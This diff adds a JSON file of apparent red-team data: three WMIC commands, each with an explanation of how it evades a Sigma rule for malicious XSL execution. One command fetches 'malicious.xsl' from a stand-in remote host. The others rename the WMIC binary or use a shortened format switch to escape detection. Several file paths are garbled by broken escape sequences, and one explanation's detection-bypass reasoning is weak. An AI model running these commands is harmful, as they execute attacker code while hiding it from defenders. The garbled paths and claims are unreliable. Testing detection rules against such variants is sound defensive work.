@@ -1,0 +1,14 @@
+[
+  {
+    "output": "wmic os get caption /f:\"C:\\path\\\to\\payload.xsl\"",
+    "explanation": "The Sigma rule specifically looks for the string '-format' or '/format'. WMIC allows the use of the shortened alias '/f' or '-f' for the format switch, which provides the same functionality while evading detections reliant on the full parameter name."
+  },
+  {
+    "output": "wmic os get /FORMAT:\"https://remote.server/malicious.xsl\"",
+    "explanation": "The rule contains a filter that excludes specific strings like 'Format:List' or 'Format:table'. However, it does not account for case sensitivity variations or the use of quotes around the parameter value in some SIEM environments. By using uppercase '/FORMAT:' or inserting extra spaces/quotes, an attacker might slip past simple substring matches depending on how the log source normalizes the command line."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\wbem\\WMIC.exe %TEMP%\\\not\\_wmic.exe && %TEMP%\\\not\\_wmic.exe process list /format:\"evil.xsl\"",
+    "explanation": "The rule relies on the process image ending with '\\wmic.exe'. By copying the binary to a different location with a different name, the 'selection' criteria for the image name is bypassed entirely while maintaining the malicious functionality."
+  }
+]
